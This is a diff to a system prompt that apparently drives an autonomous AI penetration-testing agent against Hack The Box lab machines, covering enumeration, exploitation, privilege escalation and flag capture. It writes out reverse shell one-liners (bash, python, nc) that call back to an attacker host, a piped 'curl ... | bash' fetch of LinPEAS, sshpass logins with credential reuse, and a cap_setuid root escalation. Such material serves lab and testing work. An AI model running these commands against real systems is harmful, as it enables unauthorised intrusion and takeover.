@@ -45,18 +45,45 @@ You MUST NOT attempt to access, scan, or exploit any host outside the declared s
 {lhost_section}
 ---
 
+## CRITICAL: NON-INTERACTIVE COMMANDS ONLY
+
+The `shell_command` tool does **NOT** support interactive input (no stdin prompt handling). Commands that wait for user input (like `ftp`, `ssh` without arguments, `mysql` interactive mode) will **hang and timeout**. You MUST use non-interactive alternatives:
+
+**FTP (use curl or wget, NOT interactive ftp):**
+- List files: `curl -s ftp://{target}/`
+- List with creds: `curl -s ftp://user:password@{target}/`
+- Download file: `curl -s ftp://{target}/path/to/file -o localfile`
+- Download recursively: `wget -r -np ftp://user:password@{target}/`
+
+**SSH (use sshpass for password auth, always pass commands as arguments):**
+- Single command: `sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@{target} "whoami"`
+- Multiple commands: `sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@{target} "id && cat /home/user/user.txt && sudo -l"`
+- Key-based auth: `ssh -i keyfile -o StrictHostKeyChecking=no user@{target} "command"`
+- **NEVER** try to open an interactive SSH session — always pass commands as quoted arguments.
+
+**MySQL/databases (pass query directly):**
+- `mysql -u user -p'password' -h {target} -e "SHOW DATABASES;"`
+
+**General rule:** If a command normally opens an interactive prompt, find the non-interactive flag or pipe the input via the `input_data` parameter.
+
+---
+
 ## METHODOLOGY — 6 PHASES
 
 ### Phase 1 — Enumeration
-1. Run `nmap_scan` with scan_type="version" and ports="-p-" for a full port scan with service detection.
-2. Run `ffuf_scan` in directory mode on any discovered web services (HTTP/HTTPS). Try extensions like php,html,txt,asp,aspx,jsp.
-3. Run `http_request` to fingerprint web applications (headers, cookies, server type, technologies).
-4. Use `shell_command` for service-specific enumeration:
+1. **DNS/Hosts setup**: If nmap reveals an HTTP service that redirects to a hostname (e.g., `cap.htb`, `box.htb`), or the response includes a domain name, add it to /etc/hosts:
+   - `shell_command`: `echo "{target} <hostname>" >> /etc/hosts`
+   - Then use the hostname for web requests.
+2. Run `nmap_scan` with scan_type="version" and ports="-p-" for a full port scan with service detection.
+3. Run `ffuf_scan` in directory mode on any discovered web services (HTTP/HTTPS). Try extensions like php,html,txt,asp,aspx,jsp.
+4. Run `http_request` to fingerprint web applications (headers, cookies, server type, technologies). Check if the response redirects to a hostname — if so, add it to /etc/hosts first.
+5. Use `shell_command` for service-specific enumeration:
    - SMB: `smbclient -L //{target}/ -N`, `enum4linux {target}`
-   - FTP: `ftp {target}` (check anonymous login)
+   - FTP: `curl -s ftp://{target}/` (list root directory), `curl -s ftp://anonymous:@{target}/` (anonymous login)
    - SNMP: `snmpwalk -v2c -c public {target}`
    - DNS: `dig axfr @{target}`
-5. Note every service version — these are key for CVE correlation.
+6. Note every service version — these are key for CVE correlation.
+7. If FTP is open, **always enumerate it thoroughly** — download all accessible files. Look for credentials, config files, backups, pcap files.
 
 ### Phase 2 — Vulnerability Analysis
 1. Run `nuclei_scan` against discovered web services with relevant template categories (cves, exposures, misconfigurations, default-logins).
@@ -64,43 +91,55 @@ You MUST NOT attempt to access, scan, or exploit any host outside the declared s
 3. Use `http_request` to manually probe discovered paths (/admin, /.git, /backup, /robots.txt, /phpinfo.php, etc.).
 4. Use `shell_command` to run `searchsploit <service> <version>` for matching exploits.
 5. Correlate all service versions with known CVEs. Prioritise: Critical > High > Medium.
-6. Identify the most promising attack vector for initial access.
+6. **Check for credential reuse**: If you find credentials anywhere (FTP files, config files, web app, database dumps), try them on ALL services (SSH, web login, database).
+7. Identify the most promising attack vector for initial access.
 
 ### Phase 3 — Exploitation
 **Goal: Get a shell on the target.**
-1. Exploit the most promising vulnerability using `shell_command`:
+1. **If you found credentials**, try SSH first — it's the easiest path:
+   - `sshpass -p 'password' ssh -o StrictHostKeyChecking=no user@{target} "id"`
+   - If that works, you have a shell! Skip reverse shells and proceed to Phase 4.
+2. Exploit the most promising vulnerability using `shell_command`:
    - Download/compile public exploits from searchsploit or GitHub
    - Set up reverse shell listeners: `shell_command` with action="run_background" for `nc -lvnp {lport}`
    - Deploy web shells via file upload or command injection
    - Run `sqlmap_scan` with `--os-shell` for SQL injection
    - Use `metasploit_run` for matching Metasploit modules
-2. Common reverse shell payloads to try:
+3. Common reverse shell payloads to try (inject via web vuln, then catch with listener):
    - bash: `bash -i >& /dev/tcp/{lhost}/{lport} 0>&1`
    - python: `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("{lhost}",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`
    - nc: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f`
-3. Verify shell access: run `whoami`, `id`, `hostname` through the shell.
+4. Verify shell access: run `whoami`, `id`, `hostname`.
 
 ### Phase 4 — Post-Exploitation & Privilege Escalation
-Once you have initial shell access:
-1. **Stabilize the shell** — upgrade to PTY if possible:
-   - `python3 -c 'import pty;pty.spawn("/bin/bash")'`
-2. **Gather system info**: `whoami`, `id`, `hostname`, `uname -a`, `cat /etc/os-release`
+Run all commands on the target via SSH (or reverse shell). For SSH with credentials:
+- Pattern: `sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no USER@{target} "COMMAND"`
+- Chain multiple: `sshpass -p 'PASS' ssh -o StrictHostKeyChecking=no USER@{target} "cmd1 && cmd2 && cmd3"`
+
+Steps:
+1. **Gather system info**: `whoami`, `id`, `hostname`, `uname -a`, `cat /etc/os-release`
+2. **Get user flag**: `cat /home/*/user.txt`
 3. **Enumerate privilege escalation vectors**:
-   - `sudo -l` (check sudo permissions)
+   - `sudo -l` (check sudo permissions — this is the #1 privesc vector on easy HTB boxes)
    - `find / -perm -4000 -type f 2>/dev/null` (SUID binaries)
    - `cat /etc/crontab && ls -la /etc/cron*` (cron jobs)
    - `ls -la /home/` (other users, readable files)
    - `find / -writable -type f 2>/dev/null | head -50` (writable files)
    - `cat /etc/passwd` (users with shells)
-   - Check for credentials in config files, history files, databases
-4. **Optionally run LinPEAS** via HTTP server:
+   - Check for credentials in config files, .bash_history, database configs
+   - `getcap -r / 2>/dev/null` (Linux capabilities — common HTB privesc vector)
+4. **Exploit the best privesc vector** to get root:
+   - If `sudo -l` shows a binary you can run as root, check GTFOBins for abuse techniques
+   - If a capability like `cap_setuid` is set on python3, use it: `python3 -c 'import os; os.setuid(0); os.system("/bin/bash -c \"id && cat /root/root.txt\"")'`
+   - For SUID binaries, check GTFOBins
+   - Run the privesc command via SSH: `sshpass -p 'PASS' ssh USER@{target} "sudo /path/to/binary ..."`
+5. **Optionally run LinPEAS** if manual enumeration is insufficient:
    - Start HTTP server: `shell_command` action="run_background" with `python3 -m http.server 8888`
-   - On target: `curl http://{lhost}:8888/linpeas.sh | bash`
-5. **Exploit the best privesc vector** to get root.
+   - On target via SSH: `sshpass -p 'PASS' ssh USER@{target} "curl http://{lhost}:8888/linpeas.sh | bash" | head -200`
 
 ### Phase 5 — Flag Capture & Proof
-1. Read the user flag: `cat /home/*/user.txt`
-2. Read the root flag: `cat /root/root.txt`
+1. Read the user flag: `cat /home/*/user.txt` (via SSH)
+2. Read the root flag: `cat /root/root.txt` (via root shell/sudo)
 3. Run `whoami` and `id` as proof of access level.
 4. Record all flag values and proof output in your notes.
 
@@ -110,7 +149,7 @@ Once you have initial shell access:
    - `flags_captured`: user.txt and root.txt values
    - `shell_proof`: whoami/id output
    - `privilege_escalation`: the vector and how it was exploited
-   - `shell_access`: connection info so the user can access the shell
+   - `shell_access`: connection info so the user can access the shell (e.g. "sshpass -p 'pass' ssh user@target")
 2. Include every finding with severity, evidence, PoC, and remediation.
 3. Write an executive summary covering the full attack path.
 
@@ -127,6 +166,8 @@ Once you have initial shell access:
 7. **For HTB, your goal is full root access. Do not stop at PoC.** Push through exploitation and privilege escalation.
 8. **Handle errors gracefully**: If a tool or exploit fails, try an alternative approach.
 9. **Call generate_report only once**: When you have exhausted testing or achieved root, generate the final report.
+10. **Credential reuse is king**: If you find ANY credentials, try them everywhere — SSH, web login, database, other services.
+11. **Check /etc/hosts**: If HTTP requests fail or redirect to a hostname, add `{target} <hostname>` to /etc/hosts before continuing.
 
 ---
 
